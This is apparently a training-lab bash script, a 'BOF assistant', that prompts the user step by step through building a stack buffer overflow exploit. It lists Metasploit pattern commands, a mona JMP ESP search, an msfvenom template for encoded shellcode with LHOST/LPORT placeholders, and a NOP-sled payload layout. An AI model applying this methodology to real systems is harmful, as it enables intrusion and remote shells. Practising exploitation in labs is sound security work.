#!/bin/bash
#red     \e[91m
#green   \e[92m
#yellow  \e[93m
#blue    \e[96m
#default \e[39m
echo "---------------------------------------------"
echo -e "          Welcome to BOF assistant :D"
echo "---------------------------------------------"
echo -e "\e[92mStep #01\e[39m: Have you built the exploit skeleton?\n          Did you manage to crash the app?\n          Note #1: \e[93mwe can send large buffers and move to smaller ones using binary search to guarantee a good crash\e[39m\n          Note #2: \e[93mit might take a while to crash\e[39m so be patient :D"
read
echo -e "\e[92mStep #02\e[39m: What's the buffer length?"
read
echo -e "\e[92mStep #03\e[39m: Have you generated cyclic input?\n          Command: \e[96mmsf-pattern_create -l <BUFF LENGTH>\e[39m"
read
echo -e "\e[92mStep #04\e[39m: What's the value of EIP at the crash?"
read
echo -e "\e[92mStep #05\e[39m: What's the offset value?\n          Command: \e[96mmsf-pattern_offset -l <BUFF LENGTH> -q <EIP>\e[39m"
read
echo -e "\e[92mStep #06\e[39m: Can you put 4 Cs on EIP?"
read
echo -e "\e[92mStep #07\e[39m: Are there any bad characters \e[93mbesides the null byte\e[39m?\n          Remember: \e[93mThere always the possibility of having multiple bad characters in a row. Just keep removing them one by one until the buffer is clear\e[39m"
read
echo -e "\e[92mStep #08\e[39m: Do we have enough space for our shellcode?\n          Are there any registers pointing to our shellcode that we can jump to?"
read
echo -e "\e[92mStep #09\e[39m: Have you found a return address?\n          Command: \e[96m!mona modules\e[39m then \e[96m!mona find -s '\\\xFF\\\xE4' -m <MODULE>\e[39m"
read
echo -e "\e[92mStep #10\e[39m: Did you place a breakpoint at JMP ESP to confirm EIP overwrite with our return address?"
read
echo -e "\e[92mStep #11\e[39m: Did you generate your shellcode using the correct EXITFUNC?\n          Remember: \e[93mThread function might give the app room to stay running after ending the shell\e[39m\n          Also: \e[93mRemember to add the null byte to the bad characters and to use the right amount of iterations in encoding\e[39m\n          Command: \e[96mmsfvenom -p <PAYLOAD> LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=<EXITFUNC>\n                            --platform <PLATFORM>\n                            -a <ARCH>\n                            -f <FORMAT>\n                            -b <BADCHARS>\n                            -e x86/shikata_ga_nai\n                            -i <ITERATIONS>\e[39m"
read
echo -e "\e[92mStep #12\e[39m: Did you add your NOP Sled?\n          '\\\x90' is the code.\n          How many are you going to use?"
read
echo -e "\e[92mStep #13\e[39m: Is your exploit lined up correctly?\n          \e[96m[BUFF + RET + NOPSLED + SHELLCODE]\e[39m"
read
echo -e "\e[92mStep #14\e[39m: Got your shell? :D"
read
echo "---------------------------------------------"
echo -e "          Congratz Hackerman!! :D :D"
echo "---------------------------------------------"
